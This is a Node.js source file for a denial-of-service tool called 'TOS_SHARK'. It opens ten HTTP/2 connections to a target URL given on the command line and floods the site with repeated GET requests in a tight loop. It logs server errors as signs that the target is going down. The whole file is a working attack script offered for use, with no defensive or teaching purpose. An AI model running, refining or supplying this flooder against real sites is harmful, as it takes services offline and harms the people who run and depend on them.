const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        this.target = target;
        const url = new URL(target);
        this.host = url.hostname;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        
        // H2 Connections
        this.conns = [];
        
        // Print header once
        console.log('TØS-SHARK | CUSTOM | MT-3M22');
        console.log('-----------------------------------------------------------------');
        
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    start() {
        // Setup 10 H2 connections
        for (let i = 0; i < 10; i++) {
            try {
                const client = http2.connect(this.target);
                client.setMaxListeners(1000);
                this.conns.push(client);
            } catch (e) {}
        }
        
        // Start attack
        this.attackLoop();
        
        process.on('SIGINT', () => {
            this.running = false;
            this.conns.forEach(c => c.destroy());
            process.exit(0);
        });
    }

    async attackLoop() {
        while (this.running) {
            if (this.conns.length === 0) {
                await new Promise(r => setTimeout(r, 100));
                continue;
            }
            
            // Send 50 requests per tick
            for (let i = 0; i < 50; i++) {
                const client = this.conns[Math.floor(Math.random() * this.conns.length)];
                
                try {
                    const req = client.request({
                        ':method': 'GET',
                        ':path': '/',
                        ':authority': this.host
                    });
                    
                    this.reqCounter++;
                    this.totalReqs++;
                    
                    req.on('response', (headers) => {
                        const status = headers[':status'];
                        this.logStatus(status);
                    });
                    
                    req.on('error', () => {
                        this.logStatus('ERROR');
                    });
                    
                    req.end();
                    
                } catch (e) {
                    this.totalReqs++;
                }
            }
            
            await new Promise(r => setTimeout(r, 0.1));
        }
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g', text = status;
            if (status === 'ERROR') {
                color = 'r';
                text = 'ERROR';
            } else if (status >= 500) {
                color = 'r';
            } else if (status >= 400) {
                color = 'y';
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event
            if (color === 'r' && (status >= 500 || status === 'ERROR')) {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${status}}`, 'r'));
            }
        }
    }
}

// Run
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    new TOS_SHARK(process.argv[2]);
}
